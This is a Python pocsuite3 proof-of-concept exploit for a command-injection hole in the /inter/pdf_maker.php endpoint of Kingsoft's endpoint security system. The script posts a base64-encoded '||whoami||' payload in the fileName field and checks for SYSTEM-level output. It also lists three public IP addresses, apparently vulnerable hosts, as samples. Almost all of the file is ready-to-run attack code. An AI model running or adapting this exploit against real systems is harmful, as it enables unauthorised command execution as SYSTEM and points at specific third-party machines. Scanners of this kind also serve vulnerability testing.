#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict


class TestPOC(POCBase):
    vulID = 'DSO-07033'
    cveID = ''
    cnvdID = ''
    cnnvdID = ''
    version = '1.0'
    author = ''
    vulDate = '2022-07-21'
    createDate = '2022-07-22'
    updateDate = '2022-07-25'
    name = '金山 终端安全系统 /inter/pdf_maker.php 存在命令执行漏洞'
    desc = '金山 终端安全系统存在命令执行漏洞，攻击者可利用该漏洞获取系统敏感信息等。'
    solution = '''<p>请关注厂商并更新至安全版本</p>
<p>厂商链接: <a href="https://www.ejinshan.net/" rel="nofollow">https://www.ejinshan.net/</a></p>'''
    severity = 'high'
    vulType = 'cmd-exec'
    taskType = 'app-vul'
    proto = ['http']
    scanFlag = 1
    tag = ['important']
    references = ['']
    appName = '金山 终端安全系统'
    appVersion = 'all'
    cweID = 'CWE-78'
    appPowerLink =''
    samples = ['http://119.0.253.136:6868/','http://49.234.7.74/','http://139.196.158.47/']
    isPublic = 0
    appDevLanguage = ''
    appCategory = '安全设备'
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    
    def _attack(self):
        return self._verify()

    def _verify(self):
        target = self.url + "/inter/pdf_maker.php"
        result = {}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "url=123123&fileName=fHx3aG9hbWl8fA%3D%3D"
        resp = requests.post(url=target, headers = headers, data = data, verify = False, allow_redirects=False, timeout = 10)
        if 'nt authority\\system' in resp.text and resp.status_code== 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(TestPOC)

